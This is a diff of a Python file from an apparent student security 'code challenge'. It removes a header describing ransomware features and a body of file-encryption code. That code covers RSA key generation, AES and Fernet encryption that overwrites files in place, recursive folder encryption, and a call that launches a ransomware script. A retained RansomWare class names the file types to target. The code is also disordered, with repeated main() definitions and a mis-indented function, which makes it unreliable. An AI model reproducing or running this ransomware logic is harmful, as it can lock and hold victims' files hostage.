@@ -1,32 +1,3 @@
-#! /usr/bin/python 3
-
-#Reference: Chat Gpt Assisted
-
-# Script:   code challenge 5             
-# Author: Raheem Sharif Reed                     
-# Date of latest revision: July 19,2023     
-# Purpose:In Python, create a script that utilizes the cryptography library to:
-#Prompt the user to select a mode:
-#Encrypt a file (mode 1)
-#Decrypt a file (mode 2)
-#Encrypt a message (mode 3)
-#Decrypt a message (mode 4)
-#If mode 1 or 2 are selected, prompt the user to provide a filepath to a target file.
-#If mode 3 or 4 are selected, prompt the user to provide a cleartext string.
-#Depending on the selection, perform one of the below functions. You’ll need to create four functions:
-#Encrypt the target file if in mode 1.
-#Delete the existing target file and replace it entirely with the encrypted version.
-#Decrypt the target file if in mode 2.
-#Delete the encrypted target file and replace it entirely with the decrypted version.
-#Encrypt the string if in mode 3.
-#Print the ciphertext to the screen.
-#Decrypt the string if in mode 4.
-#Print the cleartext to the screen.
-#Recursively encrypt a single folder and all its contents.
-#Recursively decrypt a single folder that was encrypted by this tool.
-#Alter the desktop wallpaper on a Windows PC with a ransomware message
-#Create a popup window on a Windows PC with a ransomware message
-
 # Imports
 from cryptography.fernet import Fernet # encrypt/decrypt files on target system
 import os # to get system root
@@ -44,9 +15,12 @@ from Crypto.Cipher import AES, PKCS1_OAEP
 import base64
 import threading # used for ransom note and decryption key on dekstop
 
+
+
 class RansomWare:
 
- # File exstensions to seek out and Encrypt
+    
+    # File exstensions to seek out and Encrypt
     file_exts = [
         'txt',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
@@ -271,154 +245,7 @@ def main():
     print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
     print('> RansomWare: Completed') # Debugging/Testing
 
-    # Function to generate a new RSA key pair
-def generate_rsa_key_pair():
-    key = RSA.generate(2048)
-    private_key = key.export_key()
-    public_key = key.publickey().export_key()
-    with open("private_key.pem", "wb") as private_key_file:
-        private_key_file.write(private_key)
-    with open("public_key.pem", "wb") as public_key_file:
-        public_key_file.write(public_key)
-
-# Function to load the RSA private key
-def load_rsa_private_key():
-    with open("private_key.pem", "rb") as private_key_file:
-        private_key = RSA.import_key(private_key_file.read())
-    return private_key
-
-# Function to load the RSA public key
-def load_rsa_public_key():
-    with open("public_key.pem", "rb") as public_key_file:
-        public_key = RSA.import_key(public_key_file.read())
-    return public_key
-
-# Function to encrypt a file using AES
-def encrypt_file(file_path, aes_key):
-    with open(file_path, "rb") as file:
-        data = file.read()
-
-    cipher = AES.new(aes_key, AES.MODE_EAX)
-    encrypted_data, tag = cipher.encrypt_and_digest(data)
-
-    with open(file_path + ".enc", "wb") as file:
-        [file.write(x) for x in (cipher.nonce, tag, encrypted_data)]
-
-# Function to decrypt a file using AES
-def decrypt_file(file_path, aes_key):
-    with open(file_path, "rb") as file:
-        nonce, tag, encrypted_data = [file.read(x) for x in (16, 16, -1)]
-
-    cipher = AES.new(aes_key, AES.MODE_EAX, nonce)
-    decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
-
-    with open(os.path.splitext(file_path)[0], "wb") as file:
-        file.write(decrypted_data)
-
-# Main function
-def main():
-    if not os.path.exists("private_key.pem") or not os.path.exists("public_key.pem"):
-        generate_rsa_key_pair()
-
-    mode = int(input("Select a mode:\n1. Encrypt a file\n2. Decrypt a file\n"))
-
-    if mode == 1:
-        file_to_encrypt = input("Enter the file path to encrypt: ")
-        public_key = load_rsa_public_key()
-        aes_key = get_random_bytes(32)  # 256-bit AES key
-        cipher_rsa = PKCS1_OAEP.new(public_key)
-        encrypted_aes_key = cipher_rsa.encrypt(aes_key)
-        with open(file_to_encrypt + ".enc_key", "wb") as key_file:
-            key_file.write(encrypted_aes_key)
-        encrypt_file(file_to_encrypt, aes_key)
-        print("File encrypted successfully.")
-    elif mode == 2:
-        file_to_decrypt = input("Enter the file path to decrypt: ")
-        private_key = load_rsa_private_key()
-        with open(file_to_decrypt + ".enc_key", "rb") as key_file:
-            encrypted_aes_key = key_file.read()
-        cipher_rsa = PKCS1_OAEP.new(private_key)
-        aes_key = cipher_rsa.decrypt(encrypted_aes_key)
-        decrypt_file(file_to_decrypt, aes_key)
-        print("File decrypted successfully.")
-    else:
-        print("Invalid mode selected.")
-
-    
 
 
-# Function to generate a new encryption key
-def generate_key():
-    key = Fernet.generate_key()
-    with open("key.key", "wb") as key_file:
-        key_file.write(key)
-    return key
-
-# Function to load the encryption key
-def load_key():
-    with open("key.key", "rb") as key_file:
-        key = key_file.read()
-    return key
-
-# Function to encrypt a file
-def encrypt_file(file_path, key):
-    with open(file_path, "rb") as file:
-        data = file.read()
-    fernet = Fernet(key)
-    encrypted_data = fernet.encrypt(data)
-    with open(file_path, "wb") as file:
-        file.write(encrypted_data)
-
-# Function to decrypt a file
-def decrypt_file(file_path, key):
-    with open(file_path, "rb") as file:
-        encrypted_data = file.read()
-    fernet = Fernet(key)
-    decrypted_data = fernet.decrypt(encrypted_data)
-    with open(file_path, "wb") as file:
-        file.write(decrypted_data)
-
-# Function to encrypt all files in a folder and its subfolders
-def encrypt_folder(folder_path, key):
-    for root, dirs, files in os.walk(folder_path):
-        for file in files:
-            file_path = os.path.join(root, file)
-            encrypt_file(file_path, key)
-
-# Function to decrypt all files in a folder and its subfolders
-def decrypt_folder(folder_path, key):
-    for root, dirs, files in os.walk(folder_path):
-        for file in files:
-            file_path = os.path.join(root, file)
-            decrypt_file(file_path, key)
-
-  
-  def run_ransomeware():
-    subprocess.run(['python', 'ransomeware.py'])
-  #ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt']) 
-  
-          
-
-# Main function
-def main():
-    if not os.path.exists("key.key"):
-        generate_key()
-
-    mode = int(input("Select a mode:\n1. Encrypt a folder\n2. Decrypt a folder\n"))
-
-    folder_to_encrypt = input("Enter the folder path: ")
-
-    key = load_key()
-
-    if mode == 1:
-        encrypt_folder(folder_to_encrypt, key)
-        print("Folder encrypted successfully.")
-    elif mode == 2:
-        decrypt_folder(folder_to_encrypt, key)
-        print("Folder decrypted successfully.")
-    else:
-        print("Invalid mode selected.")
-
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
-
